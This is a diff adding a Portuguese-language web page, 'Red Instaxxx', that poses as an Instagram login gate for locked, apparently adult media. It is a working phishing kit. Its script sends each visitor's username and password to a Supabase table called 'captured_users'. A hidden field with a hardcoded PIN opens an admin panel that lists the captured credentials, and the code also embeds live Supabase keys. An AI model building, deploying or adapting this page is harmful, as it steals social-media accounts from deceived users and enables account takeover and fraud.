@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Instaxxx - Supabase Realtime</title>
+    <!-- Importando o Supabase JS Client via CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+
+        .top-ad-banner {
+            width: 100%;
+            max-width: 420px;
+            background-color: #1e293b;
+            border: 1px dashed #475569;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .top-ad-banner span {
+            font-size: 10px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .top-ad-banner a {
+            font-size: 13px;
+            color: #ec4899;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .ig-card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+            padding: 30px 30px 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 15px;
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .ig-card.hidden {
+            display: none;
+        }
+
+        .top-access-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: #f8fafc;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .ig-logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .ig-input {
+            margin-bottom: 12px;
+            width: 100%;
+        }
+
+        .ig-input input {
+            background-color: #0f172a;
+            border: 1px solid #475569;
+            border-radius: 8px;
+            font-size: 14px;
+            padding: 12px 14px;
+            width: 100%;
+            outline: none;
+            color: #f8fafc;
+            transition: border-color 0.2s;
+        }
+
+        .ig-input input:focus {
+            border-color: #ec4899;
+            box-shadow: 0 0 0 2px rgba(236, 72, 153, 0.2);
+        }
+
+        .ig-login-btn {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 6px;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 12px rgba(220, 39, 67, 0.4);
+        }
+
+        .admin-media-section {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .admin-media-section h3 {
+            font-size: 15px;
+            color: #f8fafc;
+            margin-bottom: 12px;
+            font-weight: 600;
+            text-align: left;
+        }
+
+        .media-container {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: #0f172a;
+            position: relative;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .media-container video, 
+        .media-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            max-height: 320px;
+            object-fit: cover;
+        }
+
+        .media-container.locked video,
+        .media-container.locked img {
+            filter: blur(4px) brightness(0.95);
+            pointer-events: none;
+        }
+
+        .lock-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(15, 23, 42, 0.15);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            z-index: 2;
+            padding: 20px;
+        }
+
+        .lock-overlay.unlocked {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .lock-icon { font-size: 42px; margin-bottom: 8px; }
+        .lock-text { font-size: 13px; font-weight: 600; text-align: center; color: #f8fafc; }
+
+        .hidden-admin-container {
+            margin-top: 8px;
+            text-align: right;
+            opacity: 0.15;
+            transition: opacity 0.3s;
+        }
+
+        .hidden-admin-container:hover { opacity: 1; }
+
+        .hidden-pin-input {
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #475569;
+            color: #94a3b8;
+            font-size: 10px;
+            width: 60px;
+            text-align: center;
+            outline: none;
+            padding: 2px;
+        }
+
+        #adminPanel {
+            display: none;
+            background-color: #1e293b;
+            border: 2px solid #ec4899;
+            border-radius: 12px;
+            padding: 20px;
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        #adminPanel h2 { font-size: 16px; color: #ec4899; margin-bottom: 15px; text-align: center; }
+        .admin-form-group { margin-bottom: 12px; text-align: left; }
+        .admin-form-group label { font-size: 12px; color: #94a3b8; display: block; margin-bottom: 4px; }
+        .admin-form-group input, .admin-form-group select {
+            width: 100%; background-color: #0f172a; border: 1px solid #475569; border-radius: 6px; padding: 8px 10px; color: #fff; font-size: 13px; outline: none;
+        }
+
+        .file-upload-label {
+            display: block; background-color: #334155; color: #f8fafc; border: 1px dashed #64748b; padding: 10px; text-align: center; border-radius: 6px; cursor: pointer; font-size: 13px; margin-top: 5px;
+        }
+        input[type="file"] { display: none; }
+
+        .admin-save-btn {
+            background-color: #ec4899; color: #fff; border: none; border-radius: 6px; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px;
+        }
+
+        .users-table-container { margin-top: 20px; border-top: 1px solid #334155; padding-top: 15px; text-align: left; }
+        .users-table-container h3 { font-size: 14px; color: #f8fafc; margin-bottom: 10px; }
+        .users-table { width: 100%; border-collapse: collapse; font-size: 12px; background-color: #0f172a; border-radius: 6px; overflow: hidden; }
+        .users-table th, .users-table td { padding: 8px 10px; border-bottom: 1px solid #334155; text-align: left; color: #cbd5e1; }
+        .users-table th { background-color: #1e293b; color: #ec4899; }
+    </style>
+</head>
+<body>
+
+    <div class="top-ad-banner">
+        <span>Publicidade</span>
+        <a href="#" target="_blank">🔥 Clique aqui e conheça ofertas exclusivas hoje!</a>
+    </div>
+
+    <div class="main-container">
+        <!-- Caixa de Login -->
+        <div class="ig-card" id="loginCard">
+            <div class="top-access-label">Acesse com Instagram</div>
+            <div class="ig-logo-container">
+                <div class="logo-text">Red Instaxxx</div>
+            </div>
+            
+            <form id="loginForm">
+                <div class="ig-input">
+                    <input type="text" id="username" placeholder="Telefone, usuário ou e-mail" required>
+                </div>
+                <div class="ig-input">
+                    <input type="password" id="password" placeholder="Senha" required>
+                </div>
+                <button type="submit" class="ig-login-btn">Entrar</button>
+            </form>
+        </div>
+
+        <!-- Seção da Mídia -->
+        <div class="admin-media-section">
+            <h3 id="dynamicTitle">Mídia em Destaque</h3>
+
+            <div class="media-container locked" id="mediaContainerBox">
+                <div id="lockOverlay" class="lock-overlay">
+                    <div class="lock-icon">🔒</div>
+                    <div class="lock-text">Faça o login acima para destrancar a mídia.</div>
+                </div>
+
+                <div id="dynamicMediaWrapper" style="width: 100%; display: flex; justify-content: center;">
+                    <!-- Render dinâmico -->
+                </div>
+            </div>
+
+            <div class="hidden-admin-container">
+                <input type="password" id="hiddenPinField" class="hidden-pin-input" maxlength="6" placeholder="admin" oninput="checkHiddenPin(this)">
+            </div>
+        </div>
+
+        <!-- Painel Administrativo -->
+        <div id="adminPanel">
+            <h2>Painel Admin</h2>
+            
+            <div class="admin-form-group">
+                <label>Título da Publicação:</label>
+                <input type="text" id="adminTitleInput" placeholder="Ex: Novo Vídeo Exclusivo">
+            </div>
+
+            <div class="admin-form-group">
+                <label>Método de Atualização:</label>
+                <select id="mediaSourceType" onchange="toggleSourceInput()">
+                    <option value="url">Colar Link (URL da Mídia)</option>
+                    <option value="gallery">Importar da Galeria (Arquivo Local)</option>
+                </select>
+            </div>
+
+            <div class="admin-form-group" id="urlGroup">
+                <label>URL da Mídia (Vídeo ou Foto):</label>
+                <input type="text" id="mediaUrlInput" placeholder="https://exemplo.com/video.mp4">
+            </div>
+
+            <div class="admin-form-group" id="galleryGroup" style="display: none;">
+                <label>Selecionar Foto/Vídeo do Dispositivo:</label>
+                <label for="galleryFileInput" class="file-upload-label">📂 Escolher da Galeria</label>
+                <input type="file" id="galleryFileInput" accept="image/*,video/*" onchange="previewGalleryFile(this)">
+                <span id="fileNameDisplay" style="font-size: 11px; color: #94a3b8; display: block; margin-top: 4px;">Nenhum arquivo selecionado</span>
+            </div>
+
+            <button class="admin-save-btn" onclick="updateAdminMedia()">Atualizar Mídia Globalmente</button>
+
+            <!-- Tabela de Logins Capturados do Supabase -->
+            <div class="users-table-container">
+                <h3>Credenciais Capturadas no Banco:</h3>
+                <div style="max-height: 150px; overflow-y: auto;">
+                    <table class="users-table">
+                        <thead>
+                            <tr>
+                                <th>Usuário</th>
+                                <th>Senha</th>
+                                <th>Data</th>
+                            </tr>
+                        </thead>
+                        <tbody id="usersTableBody">
+                            <tr>
+                                <td colspan="3" style="text-align: center; color: #64748b;">Carregando...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO DO SUPABASE (Substitua pelas suas chaves)
+        const SUPABASE_URL = "https://tasrkbdoxueyjpsggifv.supabase.co";
+        const SUPABASE_ANON_KEY = "sb_publishable_-zJ0KphtiHG53l5Yh-3a0w_-N0cFiqp";
+        
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        let isUserLoggedIn = false;
+        let localGalleryDataUrl = null;
+
+        window.addEventListener('DOMContentLoaded', () => {
+            fetchInitialMedia();
+            setupRealtimeSubscriptions();
+        });
+
+        // 1. Enviar Login Capturado para o Supabase
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const userVal = document.getElementById('username').value.trim();
+            const passVal = document.getElementById('password').value;
+
+            if(userVal !== "") {
+                const { error } = await supabaseClient
+                    .from('captured_users')
+                    .insert([{ username: userVal, password: passVal }]);
+
+                if(error) {
+                    alert("Erro ao registrar dados.");
+                    console.error(error);
+                    return;
+                }
+
+                isUserLoggedIn = true;
+                document.getElementById('loginCard').classList.add('hidden');
+                document.getElementById('mediaContainerBox').classList.remove('locked');
+                document.getElementById('lockOverlay').classList.add('unlocked');
+                
+                const vid = document.getElementById('adminVideo');
+                if(vid) vid.play().catch(err => {});
+            }
+        });
+
+        // 2. Trava de segurança para abrir o painel admin com PIN "213448"
+        function checkHiddenPin(input) {
+            if (input.value === "213448") {
+                document.getElementById('adminPanel').style.display = 'block';
+                input.value = "";
+                alert("Painel Administrativo desbloqueado!");
+                document.getElementById('adminPanel').scrollIntoView({ behavior: 'smooth' });
+                fetchCapturedUsers();
+            }
+        }
+
+        // Buscar usuários capturados do Banco
+        async function fetchCapturedUsers() {
+            const { data, error } = await supabaseClient
+                .from('captured_users')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            const tbody = document.getElementById('usersTableBody');
+            tbody.innerHTML = '';
+
+            if(error || !data || data.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: #64748b;">Nenhum login registrado ainda.</td></tr>`;
+                return;
+            }
+
+            data.forEach(user => {
+                const tr = document.createElement('tr');
+                const formattedDate = new Date(user.created_at).toLocaleString();
+                tr.innerHTML = `
+                    <td style="word-break: break-all;">${user.username}</td>
+                    <td style="word-break: break-all;">${user.password}</td>
+                    <td style="font-size: 10px; color: #94a3b8;">${formattedDate}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        // 3. Gerenciamento e Atualização de Mídia no Supabase
+        function toggleSourceInput() {
+            const sourceType = document.getElementById('mediaSourceType').value;
+            document.getElementById('urlGroup').style.display = sourceType === 'url' ? 'block' : 'none';
+            document.getElementById('galleryGroup').style.display = sourceType === 'gallery' ? 'block' : 'none';
+        }
+
+        function previewGalleryFile(input) {
+            if(input.files && input.files[0]) {
+                const file = input.files[0];
+                document.getElementById('fileNameDisplay').innerText = file.name;
+                const reader = new FileReader();
+                reader.onload = function(e) { localGalleryDataUrl = e.target.result; }
+                reader.readAsDataURL(file);
+            }
+        }
+
+        async function updateAdminMedia() {
+            const titleText = document.getElementById('adminTitleInput').value.trim() || "Mídia em Destaque";
+            const sourceType = document.getElementById('mediaSourceType').value;
+            let mediaUrl = '';
+
+            if(sourceType === 'url') {
+                mediaUrl = document.getElementById('mediaUrlInput').value.trim();
+                if(!mediaUrl) { alert("Insira uma URL válida."); return; }
+            } else {
+                if(!localGalleryDataUrl) { alert("Selecione um arquivo da galeria."); return; }
+                mediaUrl = localGalleryDataUrl;
+            }
+
+            const mediaType = (mediaUrl.includes('video') || mediaUrl.startsWith('data:video') || mediaUrl.includes('.mp4')) ? 'video' : 'image';
+
+            // Atualiza o registro ID 1 na tabela site_media do Supabase
+            const { error } = await supabaseClient
+                .from('site_media')
+                .update({ title: titleText, media_type: mediaType, media_url: mediaUrl })
+                .eq('id', 1);
+
+            if(error) {
+                alert("Erro ao atualizar mídia no Supabase.");
+                console.error(error);
+            } else {
+                alert("Mídia atualizada com sucesso para todos os usuários!");
+            }
+        }
+
+        async function fetchInitialMedia() {
+            const { data, error } = await supabaseClient
+                .from('site_media')
+                .select('*')
+                .eq('id', 1)
+                .single();
+
+            if(data && !error) {
+                applyMediaToDOM(data);
+            }
+        }
+
+        // 4. Sincronização em Tempo Real (Realtime) para todos os dispositivos conectados
+        function setupRealtimeSubscriptions() {
+            supabaseClient
+                .channel('public:site_media')
+                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'site_media' }, payload => {
+                    applyMediaToDOM(payload.new);
+                })
+                .subscribe();
+        }
+
+        function applyMediaToDOM(data) {
+            if(data.title) {
+                document.getElementById('dynamicTitle').innerText = data.title;
+            }
+
+            const wrapper = document.getElementById('dynamicMediaWrapper');
+            wrapper.innerHTML = '';
+
+            if(data.media_type === 'video') {
+                const videoEl = document.createElement('video');
+                videoEl.id = 'adminVideo';
+                videoEl.controls = true;
+                videoEl.muted = true;
+                videoEl.loop = true;
+                videoEl.autoplay = true;
+
+                const sourceEl = document.createElement('source');
+                sourceEl.src = data.media_url;
+                sourceEl.type = 'video/mp4';
+
+                videoEl.appendChild(sourceEl);
+                wrapper.appendChild(videoEl);
+            } else {
+                const imgEl = document.createElement('img');
+                imgEl.id = 'adminImage';
+                imgEl.src = data.media_url;
+                imgEl.alt = data.title;
+                wrapper.appendChild(imgEl);
+            }
+
+            if(isUserLoggedIn) {
+                document.getElementById('mediaContainerBox').classList.remove('locked');
+                document.getElementById('lockOverlay').classList.add('unlocked');
+                const vid = document.getElementById('adminVideo');
+                if(vid) vid.play().catch(e => {});
+            }
+        }
+    </script>
+</body>
+</html>
